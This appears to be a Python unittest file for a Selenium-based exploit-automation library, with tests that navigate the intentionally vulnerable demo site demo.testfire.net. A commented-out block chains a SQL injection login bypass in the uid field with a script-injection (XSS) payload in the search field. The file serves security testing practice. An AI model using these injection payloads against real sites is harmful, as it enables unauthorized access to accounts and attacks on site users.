import unittest

from selenium_oxide.exploit_builder import ExploitBuilder

testfire_exploit = ExploitBuilder(
    "http",
    "demo.testfire.net"
)

testfire_driver = testfire_exploit.driver
xss_marker = "ECHO-ALPHA-TANGO"

# (
#     first_exploit
#         .get("/")
#         .get("/login.jsp")
#         .type_by_id("uid", "' OR 1=1 --")
#         .type_by_id("passw", "e")
#         .send_enter_by_id("passw")
#         .type_by_id("query", f"<script>alert(`{xss_marker}`)</script>")
#         .send_enter_by_id("query")
# )

class TestFire(unittest.TestCase):
    def test_navigation(self):
        testfire_exploit.get("/")
        self.assertEqual(testfire_driver.current_url, "http://demo.testfire.net/")

    def test_content_extraction(self):
        testfire_exploit.get("/")
        login_txt = testfire_exploit.get_contents_by_id("LoginLink")
        self.assertEqual(login_txt, "Sign In")

if __name__=='__main__':
    unittest.main()